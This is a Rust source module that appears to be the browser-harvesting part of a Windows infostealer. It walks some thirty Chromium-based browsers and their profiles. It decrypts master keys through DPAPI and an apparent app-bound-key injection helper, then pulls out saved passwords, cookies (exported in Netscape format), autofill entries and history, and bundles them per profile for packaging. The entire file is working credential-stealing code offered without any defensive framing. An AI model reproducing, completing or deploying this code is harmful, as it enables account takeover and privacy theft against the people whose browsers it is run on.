use std::{env, fs, path::{Path, PathBuf}};
use rusqlite::Connection;
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
use base64::{engine::general_purpose, Engine as _};
use serde_json::Value;
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

struct BrowserInfo {
    name: &'static str,
    user_data: PathBuf,
    has_profiles: bool,
}

struct MasterKeys {
    standard: Vec<u8>,
    app_bound: Option<Vec<u8>>,
}

fn get_browsers() -> Vec<BrowserInfo> {
    let local = env::var("LOCALAPPDATA").unwrap_or_default();
    let roaming = env::var("APPDATA").unwrap_or_default();
    vec![
        // Google Chrome family
        BrowserInfo {
            name: "Chrome",
            user_data: PathBuf::from(&local).join("Google").join("Chrome").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Chrome Beta",
            user_data: PathBuf::from(&local).join("Google").join("Chrome Beta").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Chrome Dev",
            user_data: PathBuf::from(&local).join("Google").join("Chrome Dev").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Chrome Canary",
            user_data: PathBuf::from(&local).join("Google").join("Chrome SxS").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Chromium",
            user_data: PathBuf::from(&local).join("Chromium").join("User Data"),
            has_profiles: true,
        },
        // Microsoft Edge
        BrowserInfo {
            name: "Edge",
            user_data: PathBuf::from(&local).join("Microsoft").join("Edge").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Edge Beta",
            user_data: PathBuf::from(&local).join("Microsoft").join("Edge Beta").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Edge Dev",
            user_data: PathBuf::from(&local).join("Microsoft").join("Edge Dev").join("User Data"),
            has_profiles: true,
        },
        // Brave
        BrowserInfo {
            name: "Brave",
            user_data: PathBuf::from(&local).join("BraveSoftware").join("Brave-Browser").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Brave Beta",
            user_data: PathBuf::from(&local).join("BraveSoftware").join("Brave-Browser-Beta").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Brave Nightly",
            user_data: PathBuf::from(&local).join("BraveSoftware").join("Brave-Browser-Nightly").join("User Data"),
            has_profiles: true,
        },
        // Opera (profile root = user data dir)
        BrowserInfo {
            name: "Opera",
            user_data: PathBuf::from(&roaming).join("Opera Software").join("Opera Stable"),
            has_profiles: false,
        },
        BrowserInfo {
            name: "OperaGX",
            user_data: PathBuf::from(&roaming).join("Opera Software").join("Opera GX Stable"),
            has_profiles: false,
        },
        BrowserInfo {
            name: "Opera Neon",
            user_data: PathBuf::from(&roaming).join("Opera Software").join("Opera Neon").join("User Data"),
            has_profiles: true,
        },
        // Others
        BrowserInfo {
            name: "Vivaldi",
            user_data: PathBuf::from(&local).join("Vivaldi").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Yandex",
            user_data: PathBuf::from(&local).join("Yandex").join("YandexBrowser").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "CocCoc",
            user_data: PathBuf::from(&local).join("CocCoc").join("Browser").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "CentBrowser",
            user_data: PathBuf::from(&local).join("CentBrowser").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "360Chrome",
            user_data: PathBuf::from(&local).join("360Chrome").join("Chrome").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Epic Privacy Browser",
            user_data: PathBuf::from(&local).join("Epic Privacy Browser").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Uran",
            user_data: PathBuf::from(&local).join("uCozMedia").join("Uran").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "7Star",
            user_data: PathBuf::from(&local).join("7Star").join("7Star").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Torch",
            user_data: PathBuf::from(&local).join("Torch").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Kometa",
            user_data: PathBuf::from(&local).join("Kometa").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Orbitum",
            user_data: PathBuf::from(&local).join("Orbitum").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Amigo",
            user_data: PathBuf::from(&local).join("Amigo").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Sputnik",
            user_data: PathBuf::from(&local).join("Sputnik").join("Sputnik").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Slimjet",
            user_data: PathBuf::from(&local).join("Slimjet").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Iridium",
            user_data: PathBuf::from(&local).join("Iridium").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Thorium",
            user_data: PathBuf::from(&local).join("Thorium").join("User Data"),
            has_profiles: true,
        },
        BrowserInfo {
            name: "Arc",
            user_data: PathBuf::from(&local).join("The Browser Company").join("Arc").join("User Data"),
            has_profiles: true,
        },
    ]
}

fn dpapi_decrypt(data: &[u8], entropy: Option<&[u8]>, flags: u32) -> Option<Vec<u8>> {
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        let mut ent_blob = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        let ent_ptr = match entropy {
            Some(e) => {
                ent_blob.cbData = e.len() as u32;
                ent_blob.pbData = e.as_ptr() as *mut u8;
                Some(&ent_blob as *const CRYPT_INTEGER_BLOB)
            }
            None => None,
        };
        if CryptUnprotectData(&mut input, None, ent_ptr, None, None, flags, &mut output).is_ok() {
            Some(std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec())
        } else {
            None
        }
    }
}

fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<MasterKeys> {
    let local_state = user_data_path.join("Local State");
    let content = fs::read_to_string(&local_state).ok()?;
    let json: Value = serde_json::from_str(&content).ok()?;

    let enc_key = json["os_crypt"]["encrypted_key"].as_str()?;
    let decoded = general_purpose::STANDARD.decode(enc_key).ok()?;
    if decoded.len() < 5 { return None; }
    let standard = dpapi_decrypt(&decoded[5..], None, 0)?;

    let has_app_bound = json["os_crypt"]["app_bound_encrypted_key"].as_str().is_some();
    let app_bound = if has_app_bound {
        super::chrome_inject::fetch_app_bound_key(browser_name)
            .or_else(|| super::dpapi_fallback::try_from_local_state(&json))
    } else {
        None
    };

    Some(MasterKeys { standard, app_bound })
}

fn aes_gcm_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 15 || key.len() != 32 { return None; }
    let iv = &data[3..15];
    let ciphertext = &data[15..];
    if ciphertext.len() < 16 { return None; }
    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(key));
    let nonce = Nonce::from_slice(iv);
    cipher.decrypt(nonce, ciphertext).ok()
}

fn chacha20_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 15 || key.len() != 32 { return None; }
    let iv = &data[3..15];
    let ciphertext = &data[15..];
    if ciphertext.len() < 16 { return None; }
    use chacha20poly1305::{ChaCha20Poly1305, KeyInit, aead::Aead as _};
    let cipher = ChaCha20Poly1305::new_from_slice(key).ok()?;
    cipher.decrypt(iv.into(), ciphertext).ok()
}

fn aead_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    aes_gcm_decrypt(data, key).or_else(|| chacha20_decrypt(data, key))
}

fn cookie_plaintext(pt: &[u8], is_v20: bool) -> String {
    let data = if is_v20 && pt.len() > 32 { &pt[32..] } else { pt };
    String::from_utf8_lossy(data).into_owned()
}

fn decrypt_cookie_blob(blob: &[u8], keys: &MasterKeys) -> Option<String> {
    if blob.len() < 3 {
        return None;
    }

    let try_decrypt = |key: &[u8]| -> Option<String> {
        aead_decrypt(blob, key).map(|pt| cookie_plaintext(&pt, blob.starts_with(b"v20")))
    };

    if blob.starts_with(b"v20") {
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(v) = try_decrypt(ab_key) {
                if !v.is_empty() {
                    return Some(v);
                }
            }
        }
        if let Some(v) = try_decrypt(&keys.standard) {
            if !v.is_empty() {
                return Some(v);
            }
        }
        return None;
    }

    if blob.starts_with(b"v10") || blob.starts_with(b"v11") {
        if let Some(v) = try_decrypt(&keys.standard) {
            if !v.is_empty() {
                return Some(v);
            }
        }
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(v) = try_decrypt(ab_key) {
                if !v.is_empty() {
                    return Some(v);
                }
            }
        }
        return None;
    }

    None
}

fn decrypt_cookie_value(encrypted: &[u8], plain_value: &str, keys: &MasterKeys) -> String {
    if encrypted.is_empty() {
        return plain_value.to_string();
    }

    for skip in [0usize, 32, 1, 3] {
        if encrypted.len() > skip + 3 {
            if let Some(value) = decrypt_cookie_blob(&encrypted[skip..], keys) {
                if !value.is_empty() {
                    return value;
                }
            }
        }
    }

    if let Some(dec) = dpapi_decrypt(encrypted, None, 0) {
        let value = cookie_plaintext(&dec, false);
        if !value.is_empty() {
            return value;
        }
    }

    if !plain_value.is_empty() {
        return plain_value.to_string();
    }

    String::new()
}

fn password_plaintext(pt: &[u8], is_v20: bool) -> Option<String> {
    if is_v20 && pt.len() > 32 {
        if let Ok(s) = String::from_utf8(pt[32..].to_vec()) {
            if !s.is_empty() {
                return Some(s);
            }
        }
    }
    String::from_utf8(pt.to_vec()).ok()
}

fn decrypt_value(encrypted: &[u8], keys: &MasterKeys) -> Option<String> {
    if encrypted.is_empty() { return Some(String::new()); }
    if encrypted.len() > 3 && encrypted.starts_with(b"v20") {
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(pt) = aead_decrypt(encrypted, ab_key) {
                if let Some(s) = password_plaintext(&pt, true) {
                    return Some(s);
                }
            }
        }
        if let Some(pt) = aead_decrypt(encrypted, &keys.standard) {
            if let Some(s) = password_plaintext(&pt, true) {
                return Some(s);
            }
        }
        return None;
    }
    if encrypted.len() > 3 && (encrypted.starts_with(b"v10") || encrypted.starts_with(b"v11")) {
        if let Some(pt) = aead_decrypt(encrypted, &keys.standard) {
            if let Some(s) = password_plaintext(&pt, false) {
                return Some(s);
            }
        }
        if let Some(ref ab_key) = keys.app_bound {
            if let Some(pt) = aead_decrypt(encrypted, ab_key) {
                if let Some(s) = password_plaintext(&pt, false) {
                    return Some(s);
                }
            }
        }
        return None;
    }
    dpapi_decrypt(encrypted, None, 0).and_then(|d| String::from_utf8(d).ok())
}

fn copy_db(db_path: &Path) -> Option<PathBuf> {
    if !db_path.exists() { return None; }
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let temp = env::temp_dir().join(format!("cr_db_{}.sqlite", nanos));
    fs::copy(db_path, &temp).ok()?;
    let db_name = db_path.to_string_lossy().to_string();
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in ["-wal", "-shm", "-journal"] {
        let src = PathBuf::from(format!("{}{}", db_name, suffix));
        if src.exists() {
            let dst = PathBuf::from(format!("{}{}", temp_name, suffix));
            let _ = fs::copy(&src, &dst);
        }
    }
    Some(temp)
}

fn cleanup_db(temp: &Path) {
    let temp_name = temp.to_string_lossy().to_string();
    for suffix in ["", "-wal", "-shm", "-journal"] {
        let path = PathBuf::from(format!("{}{}", temp_name, suffix));
        let _ = fs::remove_file(&path);
    }
}

fn extract_passwords(profile_path: &Path, keys: &MasterKeys) -> Option<String> {
    let temp = copy_db(&profile_path.join("Login Data"))?;
    let conn = Connection::open(&temp).ok()?;
    let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins").ok()?;
    let mut output = String::new();
    let rows = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let username: String = row.get(1)?;
        let password: Vec<u8> = row.get(2)?;
        Ok((url, username, password))
    }).ok()?;
    for row in rows.flatten() {
        let (url, username, password_enc) = row;
        if password_enc.is_empty() && username.is_empty() { continue; }
        let version = if password_enc.starts_with(b"v20") { "v20" }
            else if password_enc.starts_with(b"v10") { "v10" }
            else if password_enc.starts_with(b"v11") { "v11" }
            else { "legacy" };
        let password = decrypt_value(&password_enc, keys)
            .unwrap_or_else(|| format!("[encrypted - {}]", version));
        output.push_str(&format!("URL: {}\nUsername: {}\nPassword: {}\n{}\n",
            url, username, password, "-".repeat(50)));
    }
    drop(stmt); drop(conn); cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

fn extract_cookies(profile_path: &Path, keys: &MasterKeys) -> Option<String> {
    let db_path = if profile_path.join("Network").join("Cookies").exists() {
        profile_path.join("Network").join("Cookies")
    } else {
        profile_path.join("Cookies")
    };
    let temp = copy_db(&db_path)?;
    let conn = Connection::open(&temp).ok()?;
    let mut stmt = conn.prepare("SELECT host_key, name, encrypted_value, value, path, expires_utc, is_secure, is_httponly FROM cookies").ok()?;
    let rows = stmt.query_map([], |row| {
        let host: String = row.get(0)?;
        let name: String = row.get(1)?;
        let enc_value: Vec<u8> = row.get(2)?;
        let plain_value: String = row.get(3)?;
        let path: String = row.get(4)?;
        let expires: i64 = row.get(5)?;
        let is_secure: i64 = row.get(6)?;
        let is_httponly: i64 = row.get(7)?;
        Ok((host, name, enc_value, plain_value, path, expires, is_secure, is_httponly))
    }).ok()?;
    let mut count = 0;
    let mut body = String::new();
    for row in rows.flatten() {
        let (host, name, enc_value, plain_value, path, expires, is_secure, is_httponly) = row;
        if name.is_empty() {
            continue;
        }
        let value = decrypt_cookie_value(&enc_value, &plain_value, keys);
        let unix_expires = if expires > 0 {
            (expires / 1_000_000) - 11644473600
        } else {
            0
        };
        body.push_str(&super::netscape::format_line(
            &host,
            &path,
            is_secure != 0,
            unix_expires,
            &name,
            &value,
            is_httponly != 0,
        ));
        count += 1;
    }
    drop(stmt);
    drop(conn);
    cleanup_db(&temp);
    if count == 0 {
        Some(super::netscape::empty_file())
    } else {
        super::netscape::build_file(&body)
    }
}

fn profiles_from_local_state(user_data_path: &Path) -> Vec<(String, PathBuf)> {
    let local_state = user_data_path.join("Local State");
    let content = match fs::read_to_string(&local_state) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };
    let json: Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };

    let mut profiles = Vec::new();
    if let Some(cache) = json
        .pointer("/profile/info_cache")
        .and_then(|v| v.as_object())
    {
        for name in cache.keys() {
            if name == "System Profile" {
                continue;
            }
            let path = user_data_path.join(name);
            if path.is_dir() {
                profiles.push((name.clone(), path));
            }
        }
    }

    profiles.sort_by(|a, b| {
        profile_sort_key(&a.0).cmp(&profile_sort_key(&b.0))
    });
    profiles
}

fn profile_sort_key(name: &str) -> (u8, u32, String) {
    if name == "Default" {
        return (0, 0, String::new());
    }
    if name == "Guest Profile" {
        return (2, 0, String::new());
    }
    if let Some(n) = name.strip_prefix("Profile ") {
        if let Ok(num) = n.parse::<u32>() {
            return (1, num, String::new());
        }
    }
    (1, u32::MAX, name.to_lowercase())
}

fn get_profiles(user_data_path: &Path, has_profiles: bool) -> Vec<(String, PathBuf)> {
    if !has_profiles {
        if user_data_path.exists() {
            return vec![("Default".to_string(), user_data_path.to_path_buf())];
        }
        return Vec::new();
    }

    let mut profiles = profiles_from_local_state(user_data_path);
    let mut seen: std::collections::HashSet<String> = profiles.iter().map(|(n, _)| n.clone()).collect();

    if let Ok(entries) = fs::read_dir(user_data_path) {
        for entry in entries.flatten() {
            if !entry.path().is_dir() {
                continue;
            }
            let name = entry.file_name().to_string_lossy().to_string();
            if name == "System Profile" || name.starts_with('.') {
                continue;
            }
            let is_profile = name == "Default"
                || name == "Guest Profile"
                || name.starts_with("Profile ")
                || entry.path().join("Preferences").exists()
                || entry.path().join("Network").join("Cookies").exists()
                || entry.path().join("Cookies").exists();
            if is_profile && seen.insert(name.clone()) {
                profiles.push((name, entry.path()));
            }
        }
    }

    profiles.sort_by(|a, b| profile_sort_key(&a.0).cmp(&profile_sort_key(&b.0)));
    profiles
}

fn extract_autofill(profile_path: &Path) -> Option<String> {
    let temp = copy_db(&profile_path.join("Web Data"))?;
    let conn = Connection::open(&temp).ok()?;
    let mut stmt = conn.prepare("SELECT name, value, count FROM autofill").ok()?;
    let mut output = String::new();
    let rows = stmt.query_map([], |row| {
        let name: String = row.get(0)?;
        let value: String = row.get(1)?;
        let count: i64 = row.get(2)?;
        Ok((name, value, count))
    }).ok()?;
    for row in rows.flatten() {
        let (name, value, count) = row;
        output.push_str(&format!("Name: {}\nValue: {}\nCount: {}\n{}\n",
            name, value, count, "-".repeat(50)));
    }
    drop(stmt); drop(conn); cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

fn extract_history(profile_path: &Path) -> Option<String> {
    let temp = copy_db(&profile_path.join("History"))?;
    let conn = Connection::open(&temp).ok()?;
    let mut stmt = conn.prepare("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC").ok()?;
    let mut output = String::new();
    let rows = stmt.query_map([], |row| {
        let url: String = row.get(0)?;
        let title: String = row.get(1)?;
        let visit_count: i64 = row.get(2)?;
        let last_visit: i64 = row.get(3)?;
        Ok((url, title, visit_count, last_visit))
    }).ok()?;
    for row in rows.flatten() {
        let (url, title, visit_count, last_visit) = row;
        output.push_str(&format!("URL: {}\nTitle: {}\nVisits: {}\nLast Visit: {}\n{}\n",
            url, title, visit_count, last_visit, "-".repeat(50)));
    }
    drop(stmt); drop(conn); cleanup_db(&temp);
    if output.is_empty() { None } else { Some(output) }
}

pub fn extract_all() -> Vec<(String, String)> {
    let mut results = Vec::new();
    for browser in get_browsers() {
        if !browser.user_data.exists() {
            continue;
        }
        let keys = get_master_keys(&browser.user_data, browser.name);
        let profiles = get_profiles(&browser.user_data, browser.has_profiles);
        for (profile_name, profile_path) in profiles {
            let passwords = keys
                .as_ref()
                .and_then(|k| extract_passwords(&profile_path, k));
            let cookies = keys
                .as_ref()
                .and_then(|k| extract_cookies(&profile_path, k));
            let autofill = extract_autofill(&profile_path);
            let history = extract_history(&profile_path);

            super::zip_layout::push_profile_bundle(
                &mut results,
                browser.name,
                &profile_name,
                passwords,
                cookies,
                autofill,
                history,
            );
        }
    }
    results
}